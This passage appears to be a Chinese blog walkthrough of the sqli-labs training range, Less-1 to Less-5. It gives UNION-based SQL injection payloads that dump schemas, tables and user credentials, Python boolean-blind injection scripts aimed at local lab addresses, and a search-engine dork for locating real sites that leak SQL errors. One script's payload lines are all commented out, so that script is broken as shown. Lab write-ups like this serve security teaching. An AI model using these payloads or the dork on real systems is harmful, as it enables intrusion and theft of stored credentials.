</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>进入靶场首页，点击<code>Setup/reset Database for labs</code>，初始化数据库</p> <h2 id="唠叨"><a href="#唠叨" class="header-anchor">#</a> 唠叨</h2> <p>看到前面几关前缀，<code>GET-Error based</code>，都是基于报错注入的，这个比较好玩，经典的话通过引号闭合可以使sql语句报错</p> <p>本身执行一个sql语句不会把错误信息返回前端，报错主要由于使用了函数<code>mysql_error()</code>、<code>mysqli_error()</code>，返回了mysql的错误信息</p> <div class="custom-block danger"><p class="custom-block-title">警告</p> <p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1</p></div> <p>一些站点甚至没有处理参数空值的情况，导致本身就已经闭合，例如</p> <h3 id="字符型"><a href="#字符型" class="header-anchor">#</a> 字符型</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;SELECT * FROM users WHERE id = '<span class="token interpolation"><span class="token variable">$id</span></span>'&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>id为空时，sql语句变成了</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="数字型"><a href="#数字型" class="header-anchor">#</a> 数字型</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;SELECT * FROM users WHERE id = <span class="token interpolation"><span class="token variable">$id</span></span>&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>id为空时，sql语句变成了</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这样页面本身就可能存在报错，可以尝试谷歌语法，收集信息找到这类站点。看看得了，没有授权不要测别人网站</p> <div class="language-ini line-numbers-mode"><pre class="language-ini"><code><span class="token key attr-name">inurl:&quot;?id</span><span class="token punctuation">=</span><span class="token value attr-value">&quot;<span class="token inner-value"> intext:&quot;You have an error in your SQL syntax&quot; &quot;公司</span>&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/2.png" alt="2"></p> <h2 id="less-1"><a href="#less-1" class="header-anchor">#</a> Less-1</h2> <p>get传参 <code>?id=1'</code>时页面报错，可以猜测后台sql语句类似</p> <p><img src="/medias/sqli-labs/3.png" alt="3"></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>$id <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">&quot;select * from users where id = '$id'&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>传进去的单引号闭合了原有sql语句，后面多出一个单引号报错，使用<code>#</code>把后面注释掉后面多出的单引号就不会再报错，get传<code>#</code>时使用url编码值<code>%23</code>，所以传<code>?id=1%23</code>时不会报错</p> <p>有了sql注入点，尝试爆数据库信息，使用联合查询爆数据库信息时，要注意前后select的字段数相同，可以先使用<code>order by</code>爆字段数</p> <p>在3时不报错，4时报错，说明有3个字段</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>尝试联合查询，2、3是回显位</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/4.png" alt="4"></p> <p>爆数据库名</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata<span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>爆表名</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>爆列名</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>users'<span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>爆数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-2"><a href="#less-2" class="header-anchor">#</a> Less-2</h2> <p>传入<code>?id=1'</code>、<code>?id=1&quot;</code>时页面报错，猜测后台sql语句类似</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">&quot;select * from users where id = $id&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>后台需要整型参数id，传入字符型参数id时，sql语句多出了引号导致报错，这题就不再需要引号的闭合，直接拼接sql语句</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-3"><a href="#less-3" class="header-anchor">#</a> Less-3</h2> <p>传入参数<code>?id=1'</code>时，页面报错，传入参数<code>?id=1</code>、<code>?id=1&quot;</code>时页面没有报错，猜测后台sql语句类似</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">&quot;select * from users where id = '$id'&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>传入参数<code>?id=1'</code>时，sql语句变成了</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'1'</span>'
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>可以传<code>?id=1'</code>，把原有的单引号以及后面内容注释掉，保证sql语句正确。后面正常拼接联合查询sql语句即可</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-4"><a href="#less-4" class="header-anchor">#</a> Less-4</h2> <p>传入参数<code>?id=1&quot;</code>时，页面报错，传入参数<code>?id=1</code>、<code>?id=1'</code>时页面没有报错，猜测后台sql语句类似</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&quot;'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&quot;'</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;select * from users where id = (<span class="token interpolation"><span class="token variable">$id</span></span>)&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>传入参数<code>?id=1&quot;</code>时，sql语句变成了</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">&quot;1&quot;</span>&quot;<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/5.png" alt="5"></p> <p>所以页面报错，报错里的信息暴露了后台sql语句<code>&quot;1&quot;&quot;)</code>，可以猜测使用的是<code>($id)</code></p> <div class="custom-block danger"><p class="custom-block-title">警告</p> <p>for the right syntax to use near '&quot;1&quot;&quot;)LIMIT 0,1' at line 1</p></div> <p>可以传<code>?id=1&quot;) or 1=1%23</code>，把原有的双引号、括号以及后面内容注释掉，保证sql语句正确。后面正常拼接联合查询sql语句即可</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>&quot;<span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>经过php处理id后，id拼接成了<code>&quot;0&quot;) or 1=1%23&quot;</code>，sql语句变成了</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">&quot;0&quot;</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>接着就是正常爆库爆表操作</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>&quot;<span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-5"><a href="#less-5" class="header-anchor">#</a> Less-5</h2> <p>像前面一样，通过传入<code>?id=1'</code>、<code>?id=1&quot;</code>、<code>?id=1'</code>等参数，在<code>?id=1'</code>时页面报错<code>right syntax to use near ''1'' LIMIT 0,1'</code>，猜测后台sql语句类似</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>$id <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">&quot;select * from users where id = '$id'&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="布尔盲注"><a href="#布尔盲注" class="header-anchor">#</a> 布尔盲注</h3> <p>区别于前几题，这里没有回显位，只有两种结果<code>You are in...</code>和无回显</p> <p>写了一个布尔盲注脚本</p> <p>这个利用了<code>substr()</code>函数，通过回显是否包含<code>You are in</code>，来判断爆破的每一位是否正确</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token comment"># 下划线放最后，避免当作统配符吃掉特殊字符</span>
flags <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'</span>
flag <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>

url <span class="token operator">=</span> <span class="token string">&quot;http://192.168.6.246:8080/Less-5/&quot;</span>
i <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;脚本正在运行.......&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> s <span class="token keyword">in</span> flags<span class="token punctuation">:</span>
        <span class="token comment"># 爆库</span>
        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">&quot;99'or substr((select group_concat(schema_name) from information_schema.schemata),&quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;,1)='&quot;</span><span class="token operator">+</span>s<span class="token operator">+</span><span class="token string">&quot;'%23&quot;</span>
        <span class="token comment"># 爆表</span>
        <span class="token comment"># id = &quot;99'or substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot; + str(i)+&quot;,1)='&quot;+s+&quot;'%23&quot;</span>
        <span class="token comment"># 爆字段</span>
        <span class="token comment"># id = &quot;99'or substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&quot; + str(i)+&quot;,1)='&quot;+s+&quot;'%23&quot;</span>
        tmp_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">&quot;?id=&quot;</span> <span class="token operator">+</span> <span class="token builtin">id</span>
        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>tmp_url<span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> <span class="token string">&quot;You are in&quot;</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            i <span class="token operator">+=</span> <span class="token number">1</span>
            flag <span class="token operator">+=</span> s
            <span class="token comment"># 最后一次成功拼接作为开始，判断超时</span>
            start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[#]------</span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># 目标服务器性能可能存在差距，适当调整超时时间</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">1.5</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;盲注结束，检查flag是否是预期结果！&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;检测到长时间没有再获取到响应，该脚本布尔盲注可能并不适配退出&quot;</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    <span class="token keyword">except</span> NameError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;在第一轮循环中未找到合适的开始字符，检查环境是否适合布尔盲注或扩充flags变量(可能出现的字符&quot;</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br></div></div><p><img src="/medias/sqli-labs/6.png" alt="6"></p> <p>使用<code>left()</code>、<code>right()</code>函数实现，<code>right()</code>函数按照<code>left()</code>模板补充即可</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token comment"># 下划线放最后，避免当作统配符吃掉特殊字符</span>
flags <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'</span>
flag <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>

url <span class="token operator">=</span> <span class="token string">&quot;http://127.0.0.1:8080/Less-5/&quot;</span>
i <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;脚本正在运行.......&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    
    <span class="token keyword">for</span> s <span class="token keyword">in</span> flags<span class="token punctuation">:</span>
        <span class="token comment"># 爆库</span>
        <span class="token comment"># id = &quot;99'or left((select group_concat(schema_name) from information_schema.schemata),&quot; + str(i)+&quot;)='&quot;+ flag + s+&quot;'%23&quot;</span>
        <span class="token comment"># 爆表</span>
        <span class="token comment"># id = &quot;99'or left((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot; + str(i)+&quot;)='&quot;+ flag + s +&quot;'%23&quot;</span>
        <span class="token comment"># 爆字段</span>
        <span class="token comment"># id = &quot;99'or left((select group_concat(column_name) from information_schema.columns where table_schema=database()),&quot; + str(i)+&quot;)='&quot;+ flag + s+&quot;'%23&quot;</span>

        <span class="token comment"># 测试right函数</span>
        <span class="token comment"># id = &quot;99'or right((select group_concat(schema_name) from information_schema.schemata),&quot; + str(i)+&quot;)='&quot;+ s + flag +&quot;'%23&quot;</span>
        tmp_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">&quot;?id=&quot;</span> <span class="token operator">+</span> <span class="token builtin">id</span>
        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>tmp_url<span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> <span class="token string">&quot;You are in&quot;</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            i <span class="token operator">+=</span> <span class="token number">1</span>
            flag <span class="token operator">+=</span> s
            <span class="token comment"># 测试right函数</span>
            <span class="token comment"># flag = s + flag</span>
            <span class="token comment"># 最后一次成功拼接作为开始，判断超时</span>
            start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[#]------</span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># 目标服务器性能可能存在差距，适当调整超时时间</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">1.5</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;盲注结束，检查flag是否是预期结果！&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;检测到长时间没有再获取到响应，该脚本布尔盲注可能并不适配退出&quot;</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    <span class="token keyword">except</span> NameError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;在第一轮循环中未找到合适的开始字符，检查环境是否适合布尔盲注或扩充flags变量(可能出现的字符&quot;</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br></div></div><p><img src="/medias/sqli-labs/9.png" alt="9"></p> <p>使用<code>like</code>代替<code>=</code>实现盲注</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token comment"># 下划线放最后，避免当作统配符吃掉特殊字符</span>
flags <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'</span>
flag <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>

url <span class="token operator">=</span> <span class="token string">&quot;http://127.0.0.1:8080/Less-5/&quot;</span>
i <span class="token operator">=</span> <span class="token number">1</span>
start <span class="token operator">=</span> <span class="token boolean">None</span>  <span class="token comment"># 初始化 start 变量</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;脚本正在运行.......&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    
    <span class="token keyword">for</span> s <span class="token keyword">in</span> flags<span class="token punctuation">:</span>
        <span class="token comment"># 爆库</span>
        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">&quot;99'or left((select group_concat(schema_name) from information_schema.schemata),&quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;) like '&quot;</span><span class="token operator">+</span> flag <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">&quot;%25&quot;</span> <span class="token operator">+</span><span class="token string">&quot;'%23&quot;</span>
        <span class="token comment"># 爆表</span>
        <span class="token comment"># id = &quot;99'or left((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot; + str(i)+&quot;)='&quot;+ flag + s +&quot;'%23&quot;</span>
        <span class="token comment"># 爆字段</span>
        <span class="token comment"># id = &quot;99'or left((select group_concat(column_name) from information_schema.columns where table_schema=database()),&quot; + str(i)+&quot;)='&quot;+ flag + s+&quot;'%23&quot;</span>

        tmp_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">&quot;?id=&quot;</span> <span class="token operator">+</span> <span class="token builtin">id</span>
        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>tmp_url<span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> <span class="token string">&quot;You are in&quot;</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            i <span class="token operator">+=</span> <span class="token number">1</span>
            flag <span class="token operator">+=</span> s
            <span class="token comment"># 最后一次成功拼接作为开始，判断超时</span>
            start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[#]------</span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># 目标服务器性能可能存在差距，适当调整超时时间</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">1.5</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;盲注结束，检查flag是否是预期结果！&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;检测到长时间没有再获取到响应，该脚本布尔盲注可能并不适配退出&quot;</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    <span class="token keyword">except</span> NameError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;在第一轮循环中未找到合适的开始字符，检查环境是否适合布尔盲注或扩充flags变量(可能出现的字符&quot;</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span 